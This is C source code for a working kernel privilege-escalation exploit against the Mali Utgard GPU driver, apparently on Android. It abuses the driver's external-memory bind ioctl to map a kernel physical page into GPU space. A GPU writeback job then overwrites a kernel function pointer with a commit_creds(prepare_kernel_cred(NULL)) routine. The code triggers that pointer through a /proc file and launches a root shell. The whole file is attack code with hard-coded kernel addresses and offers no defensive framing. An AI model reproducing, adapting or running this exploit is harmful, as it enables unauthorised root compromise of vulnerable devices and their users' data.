#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

// IOCTL defs
#define MALI_IOC_BASE 0x82
#define _MALI_UK_CORE_SUBSYSTEM 0
#define _MALI_UK_MEMORY_SUBSYSTEM 1
#define _MALI_UK_PP_SUBSYSTEM 2

#define MALI_IOC_CORE_BASE (_MALI_UK_CORE_SUBSYSTEM + MALI_IOC_BASE)
#define MALI_IOC_MEMORY_BASE (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)
#define MALI_IOC_PP_BASE (_MALI_UK_PP_SUBSYSTEM + MALI_IOC_BASE)

#define _MALI_NOTIFICATION_PP_FINISHED ((_MALI_UK_PP_SUBSYSTEM << 16) | 0x10)

#define _MALI_UK_WAIT_FOR_NOTIFICATION 2
#define _MALI_UK_ALLOC_MEM 0
#define _MALI_UK_FREE_MEM 1
#define _MALI_UK_BIND_MEM 2
#define _MALI_UK_UNBIND_MEM 3
#define _MALI_UK_PP_START_JOB 0

// struct size constants
#define MALI_UK_TIMELINE_MAX 3
#define _MALI_PP_MAX_SUB_JOBS 8
#define _MALI_PP_MAX_FRAME_REGISTERS ((0x058 / 4) + 1) /* 23 */
#define _MALI_PP_MAX_WB_REGISTERS ((0x02C / 4) + 1)    /* 12 */
#define _MALI_DLBU_MAX_REGISTERS 4

// flag for mem
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

// function defs for root
typedef struct cred *(*prepare_kernel_cred_t)(void *);
typedef int (*commit_creds_t)(struct cred *);

// kernel structs
typedef struct
{
    uint32_t points[MALI_UK_TIMELINE_MAX];
    int32_t sync_fd;
} mali_uk_fence_t;

typedef struct
{
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle;
    int32_t  secure_shared_fd; // needed on some devices
} mali_uk_alloc_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t free_pages_nr;
} mali_uk_free_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t vaddr;
    uint32_t size;
    uint32_t flags;
    uint32_t padding;
    union
    {
        struct
        {
            uint32_t secure_id;
            uint32_t rights;
            uint32_t flags;
        } bind_ump;
        struct
        {
            uint32_t mem_fd;
            uint32_t rights;
            uint32_t flags;
        } bind_dma_buf;
        struct
        {
            uint32_t phys_addr;
            uint32_t rights;
            uint32_t flags;
        } bind_ext_memory;
    } mem_union;
} mali_uk_bind_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t flags;
    uint32_t vaddr;
} mali_uk_unbind_mem_s;

typedef struct
{
    uint64_t ctx;
    uint64_t user_job_ptr;
    uint32_t priority;
    uint32_t frame_registers[_MALI_PP_MAX_FRAME_REGISTERS];
    uint32_t frame_registers_addr_frame[_MALI_PP_MAX_SUB_JOBS - 1];
    uint32_t frame_registers_addr_stack[_MALI_PP_MAX_SUB_JOBS - 1];
    uint32_t wb0_registers[_MALI_PP_MAX_WB_REGISTERS];
    uint32_t wb1_registers[_MALI_PP_MAX_WB_REGISTERS];
    uint32_t wb2_registers[_MALI_PP_MAX_WB_REGISTERS];
    uint32_t dlbu_registers[_MALI_DLBU_MAX_REGISTERS];
    uint32_t num_cores;
    uint32_t perf_counter_flag;
    uint32_t perf_counter_src0;
    uint32_t perf_counter_src1;
    uint32_t frame_builder_id;
    uint32_t flush_id;
    uint32_t flags;
    uint32_t tilesx;
    uint32_t tilesy;
    uint32_t heatmap_mem;
    uint32_t num_memory_cookies;
    uint64_t memory_cookies;
    mali_uk_fence_t fence;
    uint64_t timeline_point_ptr;
} mali_uk_pp_start_job_s;

typedef struct
{
    uint64_t ctx;
    uint32_t type;
    uint32_t _pad;
    union
    {
        struct
        {
            uint64_t user_job_ptr;
            uint32_t status;
            uint32_t perf_counter0[_MALI_PP_MAX_SUB_JOBS];
            uint32_t perf_counter1[_MALI_PP_MAX_SUB_JOBS];
            uint32_t perf_counter_src0;
            uint32_t perf_counter_src1;
        } pp_job_finished;
        uint8_t raw[88];
    } data;
} mali_uk_wait_for_notification_s;

// ioctl numbers for mali
#define MALI_IOC_MEM_ALLOC \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_FREE \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, mali_uk_free_mem_s)
#define MALI_IOC_MEM_BIND \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, mali_uk_bind_mem_s)
#define MALI_IOC_MEM_UNBIND \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, mali_uk_unbind_mem_s)
#define MALI_IOC_PP_START_JOB \
    _IOWR(MALI_IOC_PP_BASE, _MALI_UK_PP_START_JOB, mali_uk_pp_start_job_s)
#define MALI_IOC_WAIT_FOR_NOTIFICATION \
    _IOWR(MALI_IOC_CORE_BASE, _MALI_UK_WAIT_FOR_NOTIFICATION, mali_uk_wait_for_notification_s)

// PP frame register indices (hardware-defined)
#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR 1
#define FR_FLAGS 3
#define FR_CLEAR_DEPTH 4
#define FR_CLEAR_STENCIL 5
#define FR_CLEAR_COLOR_0 6
#define FR_CLEAR_COLOR_1 7
#define FR_CLEAR_COLOR_2 8
#define FR_CLEAR_COLOR_3 9
#define FR_WIDTH 10
#define FR_HEIGHT 11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA 18
#define FR_BLOCKING 20
#define FR_SCALE 21
#define FR_FOUREIGHT 22

// WB register indices (hardware-defined)
#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE 3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH 5
#define WB_MRT_BITS 6

// Constant-colour fragment shader (output = clear_color register)
static const uint32_t fragment_shader[] = {
    0x00020425,
    0x0000000c,
    0x01e007cf,
    0xb0000000,
    0x000005f5,
};

// exploit constants
#define PAGE_SIZE 4096

// target a fop function pointer > 0x400 inside of
// a page or you tend to hit open method = bad as no r1
#define TARGET_KERNEL_VA   0xc0b6f714   /* kernel VA to overwrite       */
#define TARGET_PHYS_ADDR   0x80b6f000   /* page-aligned physical address */
#define TARGET_PAGE_OFFSET 0x724        /* byte offset within page       */

#define PREPARE_KERNEL_CRED_ADDR 0xc013fbe4
#define COMMIT_CREDS_ADDR        0xc013f638

#define VICTIM_PROC_FILE_PATH "/proc/driver/wmt_aee"

// GPU VA layout
#define GPU_VA_DATA 0x40000000
#define GPU_VA_TARGET 0x40030000
#define BUF_SIZE (PAGE_SIZE * 4)

// Buffer offsets for job components
#define OFF_PLB 0x000
#define OFF_SHADER 0x080
#define OFF_RSW 0x100
#define OFF_TILEBLK 0x200
#define OFF_STACK 0x1000

static int fd = -1;

// nice lil status function
static const char *status_str(uint32_t s)
{
    if (s & (1 << 16))
        return "SUCCESS";
    if (s & (1 << 17))
        return "OUT_OF_MEMORY";
    if (s & (1 << 18))
        return "ABORT";
    if (s & (1 << 19))
        return "TIMEOUT";
    if (s & (1 << 20))
        return "HANG";
    if (s & (1 << 21))
        return "SEG_FAULT";
    if (s & (1 << 22))
        return "ILLEGAL_JOB";
    if (s & (1 << 23))
        return "UNKNOWN_ERR";
    return "???";
}

// unbind wrapper
static int unbind(uint32_t gpu_vaddr)
{
    mali_uk_unbind_mem_s args;
    memset(&args, 0, sizeof(args));
    args.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    args.vaddr = gpu_vaddr;
    return ioctl(fd, MALI_IOC_MEM_UNBIND, &args);
}

int trigger_overwritten_function_pointer()
{
    uint64_t buffer[1024];
    int fd;

    // Try to open the device normally
    fd = open("/proc/driver/wmt_aee", O_RDONLY);
    if (fd < 0)
    {
        return 1;
    }

    ssize_t bytes_read = read(fd, buffer, sizeof(buffer));

    close(fd);

    return 0;
}

// function to be executed by the kernel to escalate privileges
void get_root_shell() {
    prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;
    commit_creds_t commit_creds = (commit_creds_t)COMMIT_CREDS_ADDR;

    commit_creds(prepare_kernel_cred(NULL));
}

void important_ascii_art()
{
    printf("\n");
    printf("\033[38;5;22m");
    printf("██   ██  ██████  ██████  ████████ \n");
    printf("\033[38;5;28m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;34m");
    printf("█████   ██    ██ ██████     ██    \n");
    printf("\033[38;5;40m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;46m");
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
    printf("\n\033[38;5;34m         T11 Translator\033[0m\n\n");
}

int main()
{
    important_ascii_art();

    // Open mali ting
    fd = open("/dev/mali", O_RDWR);
    if (fd < 0)
    {
        printf("[-] open /dev/mali: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Successfully opened /dev/mali (fd=%d)\n\n", fd);

    // Step 1: Bind target kernel physical page into GPU VA space
    printf("[1] Binding phys 0x%08x -> GPU 0x%08x\n",
           TARGET_PHYS_ADDR, GPU_VA_TARGET);
    mali_uk_bind_mem_s bind = {0};
    bind.vaddr = GPU_VA_TARGET;
    bind.size = PAGE_SIZE;
    bind.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    bind.mem_union.bind_ext_memory.phys_addr = TARGET_PHYS_ADDR;
    bind.mem_union.bind_ext_memory.rights = 0x37;
    if (ioctl(fd, MALI_IOC_MEM_BIND, &bind) < 0)
    {
        printf("[-] BIND rejected: %s (errno=%d)\n", strerror(errno), errno);
        close(fd);
        return 1;
    }
    printf("[+] BIND accepted\n\n");

    // Step 2: Allocate GPU memory for PP job data
    printf("[2] Allocating job data buffer at GPU 0x%08x\n", GPU_VA_DATA);
    mali_uk_alloc_mem_s alloc = {0};
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.psize = BUF_SIZE;
    alloc.vsize = BUF_SIZE;
    if (ioctl(fd, MALI_IOC_MEM_ALLOC, &alloc) < 0)
    {
        printf("[-] ALLOC failed: %s (errno=%d)\n", strerror(errno), errno);
        unbind(GPU_VA_TARGET);
        close(fd);
        return 1;
    }
    printf("[+] Allocated: backend_handle=0x%llx\n\n",
           (unsigned long long)alloc.backend_handle);

    // Step 3: Map job data buffer into CPU address space
    printf("[3] mmap job data buffer for CPU access\n");
    void *buf = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED)
    {
        printf("[-] mmap: %s\n", strerror(errno));
        goto free_gpu;
    }
    printf("[+] CPU ptr=%p\n\n", buf);

    // Step 4: Build PP job
    memset(buf, 0, BUF_SIZE);

    uint32_t gpu_plb = GPU_VA_DATA + OFF_PLB;
    uint32_t gpu_shader = GPU_VA_DATA + OFF_SHADER;
    uint32_t gpu_rsw = GPU_VA_DATA + OFF_RSW;
    uint32_t gpu_tileblk = GPU_VA_DATA + OFF_TILEBLK;
    uint32_t gpu_stack = GPU_VA_DATA + OFF_STACK;

    memcpy((uint8_t *)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));

    uint32_t *rsw = (uint32_t *)((uint8_t *)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = gpu_shader | 5;
    rsw[0x0D] = 0x00000100;

    uint32_t *plb = (uint32_t *)((uint8_t *)buf + OFF_PLB);
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | ((gpu_tileblk >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000;
    plb[4] = 0x00000000;
    plb[5] = 0xBC000000;

    uint32_t wb_target = GPU_VA_TARGET + TARGET_PAGE_OFFSET;
    printf("[4] Building PP job:\n    WB target=0x%08x\n    value to write=0x%08x\n", wb_target, (uint32_t) get_root_shell);

    mali_uk_pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xDEADBEEFCAFEBABEULL;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = gpu_plb;
    job.frame_registers[FR_RENDER_ADDR] = gpu_rsw;
    job.frame_registers[FR_FLAGS] = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH] = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0] = (uint32_t)get_root_shell;
    job.frame_registers[FR_CLEAR_COLOR_1] = (uint32_t)get_root_shell;
    job.frame_registers[FR_CLEAR_COLOR_2] = (uint32_t)get_root_shell;
    job.frame_registers[FR_CLEAR_COLOR_3] = (uint32_t)get_root_shell;
    job.frame_registers[FR_WIDTH] = 0x100;
    job.frame_registers[FR_HEIGHT] = 0x100;
    job.frame_registers[FR_FRAG_STACK_ADDR] = gpu_stack;
    job.frame_registers[FR_DUBYA] = 0x77;
    job.frame_registers[FR_SCALE] = 0x0C;
    job.frame_registers[FR_FOUREIGHT] = 0x8888;

    job.wb0_registers[WB_TYPE] = 0x02;
    job.wb0_registers[WB_ADDRESS] = wb_target;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH] = (16 * 4) / 8;
    job.wb0_registers[WB_MRT_BITS] = 4;

    job.fence.sync_fd = -1;
    uint32_t timeline_point = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&timeline_point;

    // Step 5. Submit the job
    printf("\n[5] Submitting PP job...\n");
    int ret = ioctl(fd, MALI_IOC_PP_START_JOB, &job);
    if (ret != 0)
    {
        printf("[-] PP_START_JOB: %s (errno=%d)\n", strerror(errno), errno);
        goto unmap;
    }
    printf("[+] Submitted, timeline_point=%u\n", timeline_point);

    // Step 6: Wait for job to complete
    printf("\n[6] Waiting for notification...\n");
    mali_uk_wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    ret = ioctl(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif);
    if (ret != 0)
    {
        printf("[-] WAIT_FOR_NOTIFICATION: %s (errno=%d)\n", strerror(errno), errno);
        goto unmap;
    }

    if (notif.type == _MALI_NOTIFICATION_PP_FINISHED)
    {
        uint32_t st = notif.data.pp_job_finished.status;
        printf("[+] PP_FINISHED: status=0x%08x (%s)\n", st, status_str(st));
        if (st & (1 << 16))
            printf("[+] Write primitive: OK - 0x41414141 -> 0x%08x\n",
                   TARGET_KERNEL_VA);

        printf("\n[7] Triggering overwritten function pointer via %s...\n", VICTIM_PROC_FILE_PATH);
        trigger_overwritten_function_pointer();
    }
    else
    {
        printf("[?] Unexpected notification type: 0x%08x\n", notif.type);
    }

    printf("\n[8] Did we get root?\n");

    if (getuid() == 0)
    {
        printf("[+] We got root! Popping shell...\n");
        char *shell = "/system/bin/sh";
        char *args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    }
    else
    {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

unmap:
    munmap(buf, BUF_SIZE);
    unbind(GPU_VA_TARGET);
free_gpu:;
    mali_uk_free_mem_s mfree = {0};
    mfree.gpu_vaddr = GPU_VA_DATA;
    ioctl(fd, MALI_IOC_MEM_FREE, &mfree);
    close(fd);
    return 0;
}
